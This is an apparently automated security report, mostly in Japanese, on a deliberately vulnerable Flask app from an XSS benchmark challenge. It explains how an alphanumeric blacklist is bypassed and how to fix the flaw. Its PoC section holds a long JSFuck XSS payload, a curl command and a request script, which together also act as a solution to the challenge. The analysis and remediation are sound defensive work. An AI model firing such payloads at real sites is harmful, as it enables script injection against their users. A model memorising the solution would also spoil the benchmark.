# Security Analysis: app.py - Process execution resource

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-010-24/src/app.py`
- **検出パターン**: Process execution resource

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `XSS`

## PAR Policy Analysis

### Principals (データ源)

- **request.form.get('name','')**: Untrusted
  - Context: FlaskのPOSTリクエストから取得されるユーザー入力。/pageエンドポイントの68行目で取得。
  - Risk Factors: 直接的なユーザー入力, 検証がブラックリストベースで不完全, JSFuckによるバイパスが可能

### Actions (セキュリティ制御)

- **blacklist検証 (string.lowercase + string.uppercase + string.digits + '<>')**: Bypassed
  - Function: 英数字と<>記号をブロックしてXSS攻撃を防止
  - Weaknesses: ブラックリストベースのアプローチは根本的に脆弱, JSFuck（[]()!+のみを使用するJS難読化）でバイパス可能, ダブルクォート(")がブラックリストに含まれていない
  - Bypass Vectors: JSFuck encoding: []()!+の6文字のみでJavaScriptを表現, ダブルクォート(")で文字列をエスケープ, Unicode/エンコーディングバイパス
- **cgi.escape(result)**: Insufficient
  - Function: resultのHTML特殊文字をエスケープ
  - Weaknesses: ユーザー入力(msg)に対しては適用されていない, resultのみエスケープ（58行目）
  - Bypass Vectors: 

### Resources (操作対象)

- **HTMLレスポンス生成（script_content内へのユーザー入力埋め込み）**: Critical
  - Operation: HTML/JavaScript出力
  - Protection: ブラックリストフィルタ（バイパス可能）, X-XSS-Protection: 0で明示的に保護を無効化
- **subprocess.Popen(['timeout','5','phantomjs', 'check.js'])**: Medium
  - Operation: プロセス実行
  - Protection: 引数は静的に定義, timeoutで実行時間を制限
- **ファイル書き込み（open(fn, 'w')）**: Medium
  - Operation: ファイルシステム操作
  - Protection: ランダムなファイル名（os.urandom(16)）, finally節での削除（os.unlink）

### Policy Violations

#### XSS-001: ユーザー入力がサニタイズされずにHTMLレスポンスに埋め込まれている

- **Path**: request.form.get('name') -> blacklist検証（バイパス可能） -> script_content（%s埋め込み） -> HTMLレスポンス
- **Severity**: critical
- **Confidence**: 0.90

#### XSS-002: X-XSS-Protectionヘッダーが明示的に無効化されている

- **Path**: response.headers['X-XSS-Protection'] = '0'
- **Severity**: medium
- **Confidence**: 1.00

## マッチしたソースコード

```code
subprocess.Popen
```

## 詳細解析

このFlaskアプリケーションには**重大なReflected XSS脆弱性**が存在します。

**脆弱性の詳細:**

1. `/page`エンドポイント（66-83行目）において、ユーザー入力`msg`がJavaScriptコード内に直接埋め込まれています（77行目）。

2. **ブラックリストフィルタのバイパス**: 69行目でアルファベット、数字、`<>`をブロックしていますが、このフィルタは**JSFuck**（JavaScriptを`[]()!+`の6文字のみで記述する技法）を使用して完全にバイパス可能です。例えば`alert('XSS')`は`[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+...`のような形式で表現できます。

3. **X-XSS-Protection: 0**: 82行目でブラウザのXSS保護が明示的に無効化されており、攻撃の成功率が高まります。

4. **`check_xss`関数**: この関数はPhantomJSを使用してXSSを検証しますが、subprocess.Popen自体は静的な引数を使用しているため、直接的なコマンドインジェクションのリスクは低いです。ただし、ユーザー入力を含むHTMLファイルが一時的に作成されます。

5. **cgi.escape()の不完全な使用**: 58行目でresultに対してのみエスケープが適用されており、ユーザー入力msgに対しては適用されていません。

## PoC（概念実証コード）

```text
# XSS PoC using JSFuck encoding
# JSFuckはJavaScriptを[]()!+の6文字のみで表現する技法です
# これによりブラックリスト（英数字と<>）を完全にバイパスできます

import requests

# JSFuckでエンコードされた alert('XSS')
# 実際のJSFuckペイロードは非常に長いため、以下は概念的な例です
jsfuck_payload = '''"+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+"'''  # これは簡略化した例

# 実際の攻撃例:
# 1. ダブルクォートでJavaScript文字列をエスケープ
# 2. JSFuckでalert('XSS')を実行

# より単純なバイパス例（ダブルクォートエスケープ + JSFuck）:
basic_payload = '";[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()()//'

# curlコマンドでの実行例:
# curl -X POST http://target:5000/page -d 'name=";JSFUCK_PAYLOAD//'

# Python requestsでの概念的なPoCコード（実行はしない）
def poc_xss():
    target_url = "http://localhost:5000/page"
    
    # ペイロード: ダブルクォートで文字列をクローズし、JSFuckコードを挿入
    # JSFuck alert('XSS')は実際には数千文字になります
    payload = {
        'name': '";' + '[JSFuck encoded alert("XSS")]' + '//'
    }
    
    # response = requests.post(target_url, data=payload)
    # print(response.text)
    print("PoC payload generated (not executed)")
    print(f"Target: {target_url}")
    print(f"Parameter: name")
    print(f"Bypass method: JSFuck encoding to avoid alphanumeric blacklist")

if __name__ == '__main__':
    poc_xss()
```

## 修復ガイダンス

### 入力検証（blacklistフィルタ）

- **Required**: ブラックリストからホワイトリストベースの検証に変更
- **Guidance**: ブラックリストではなく、許可する文字のホワイトリストを定義し、それ以外の入力を拒否する。例: re.match(r'^[a-zA-Z0-9\s]+$', msg)
- **Priority**: critical

### 出力エンコーディング

- **Required**: JavaScript文字列内へのユーザー入力埋め込み時に適切なエスケープを実施
- **Guidance**: json.dumps()を使用してJavaScript文字列リテラルとして安全にエンコードする。例: import json; script_content = f'var name = {json.dumps(msg)};'
- **Priority**: critical

### X-XSS-Protectionヘッダー

- **Required**: XSS保護を無効化せず、Content-Security-Policyを導入
- **Guidance**: X-XSS-Protection: 0を削除し、Content-Security-Policy: script-src 'self'を設定してインラインスクリプトを制限する
- **Priority**: high

### テンプレートエンジン

- **Required**: 文字列フォーマットではなくJinja2テンプレートの自動エスケープを使用
- **Guidance**: Flaskのrender_template()とJinja2の自動エスケープ機能を活用し、{{ variable | safe }}は使用しない
- **Priority**: high

## 解析ノート

このコードはXSSチャレンジのCTFアプリケーションです。主要な脆弱性は以下の通りです:

1. XSS脆弱性（Reflected XSS）: 77行目でユーザー入力(msg)が直接scriptタグ内に埋め込まれています。ブラックリストによる検証は英数字と<>をブロックしていますが、JSFuck（JavaScript難読化）を使用してバイパス可能です。

2. subprocess.Popen: 34行目でphantomjsが実行されていますが、引数は静的に指定されており、コマンドインジェクションの直接的なリスクは低い。

3. ファイル書き込み: 38-40行目でユーザー入力を含むHTMLがファイルに書き込まれています（pageにはユーザー入力が含まれる）。

4. X-XSS-Protection: 0に設定されており、ブラウザのXSS保護を明示的に無効化しています。

主要な攻撃パスは: request.form.get('name') -> msg -> script_content -> HTMLレスポンス

